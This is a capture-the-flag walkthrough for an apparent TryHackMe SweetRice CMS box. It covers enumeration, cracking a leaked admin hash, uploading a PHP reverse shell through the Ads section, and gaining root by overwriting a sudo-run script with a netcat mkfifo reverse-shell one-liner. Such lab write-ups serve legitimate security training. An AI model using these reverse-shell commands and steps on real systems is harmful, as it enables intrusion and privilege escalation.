@@ -1,0 +1,118 @@
+Enumeration :
+
+Start off with a trusty nmap scan : 
+>nmap -A -sV -sC 10.10.96.107 
+
+We get the following : 
+
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
+|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
+|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+As there is a web server lets get gobuster running whilst we check out the website. I used the following for gobuster :
+>gobuster dir -u http://10.10.96.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+Looks like the main page is just the Apache2 landing page so not going to get much out of this. I checked the S/C but there is nothing of note here,
+looks like I need to wait for the gobuster scan.
+Gobuster finds the following : 
+
+/content              (Status: 301) [Size: 314] [--> http://10.10.96.107/content/]
+/server-status        (Status: 403) [Size: 277]   
+
+The content page is the most interesting out the bunch but this only gets us to a landing page which shows the following : 
+
+"Welcome to SweetRice - Thank your for install SweetRice as your website management system.
+This site is building now , please come late.
+
+If you are the webmaster,please go to Dashboard -> General -> Website setting
+
+and uncheck the checkbox "Site close" to open your website.
+
+More help at Tip for Basic CMS SweetRice installed"
+
+The mention of "Sweetrice" is interesting so we need to put a pin in this for a second.
+
+If we run the same gobuster but this time include the /content we get the following : 
+
+/images               (Status: 301) [Size: 321] [--> http://10.10.96.107/content/images/]
+/js                   (Status: 301) [Size: 317] [--> http://10.10.96.107/content/js/]    
+/inc                  (Status: 301) [Size: 318] [--> http://10.10.96.107/content/inc/]   
+/as                   (Status: 301) [Size: 317] [--> http://10.10.96.107/content/as/]    
+/_themes              (Status: 301) [Size: 322] [--> http://10.10.96.107/content/_themes/]
+/attachment           (Status: 301) [Size: 325] [--> http://10.10.96.107/content/attachment/]
+
+
+Working through these options the /as get us too a login page for SweetRice but we still don't have creds. The /inc page has a tonne of extra directories so lets sift through
+those.
+Most of the files in here are deadends with the exception of the "myswl_backup/" directory - this gives us a "mysql_backup" file which will let us download and save it.
+Theres a lot of data in here but if you look closely you can find, in the following section, a user name and passowrd ""Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\
+"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\"
+in my haste i tried the username "admin" and password as "42f749ade7f9e195bf475f37a44cafcb" which didn't work. Then tried the user name as "Manager" with the same password but 
+still no luck.
+It then dawned on me that the password is a hash, so going to my favourite hash cracking site hashes.com i popped in the hash which then gave me the passeord "Password123".
+This with the manager user name got me in.
+
+This is the point which really got be thinking. Natually I saw the Media Center section and instantly though I could get a shell to upload and I would be in. I spent a HELL of 
+time in BURP trying to bypass all the upload restrictions to get this PHP shell to upload but it just would not complete, or if it did complete, the shell would be no where that
+I could then find to trigger it.
+Haven't giving up on this and trying to find a different route (but still adament this was the correct way) I looked in the "Ads" section > bingo.
+Quick upload of the pentestermonkey PHP reverse shell (after re-configuring it with my tun0 IP) this was uploaded with no issues.
+
+Going back to the /contect/inc directory there is an ads folder and there was my shell. I set up a netcat listener (>nc -lnvp 4444) and click on the shell file to connect the 
+listener - and we are in!
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+User Flag:
+
+As per usual we need to update the shell by doing the following : 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Then doing cd /home/itguy we can see the user .txt file.
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Root Flag:
+
+Next we need to escalate this user too root. For this we can see if this user has any sudo privledges by doing ">sudo -l". Luckily we get the following : 
+
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+Looks like we have a file we can run using sudo (/home/itguy/backup.pl) but just cant change it : 
+
+cat /home/itguy/backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+
+This file runs another file (file-ception much) "/etc/copy.sh" so lets check out what this one does.
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+
+This looks like a bash script to setup a different shell AND it looks like we can write to this file via echo. If you copy the script and put echo in front of it, change the IP
+it should look something like this : 
+>echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.36.222 433 >/tmp/f" > /etc/copy.sh
+
+Once done you will need to first, set up another netcat listener using the new port on your local machine > then in the original shell run the following : 
+sudo /usr/bin/perl /home/itguy/backup.pl
+This should then get your new shell connected and a quick ">whoami" will (hopefully) confirm root.
+
+Quick note - if the above echo command doesn't stick OR the sudo command does give you root, try resetting the machine as I had to do this to get it to work :)
+
+
+
+
+
+
+
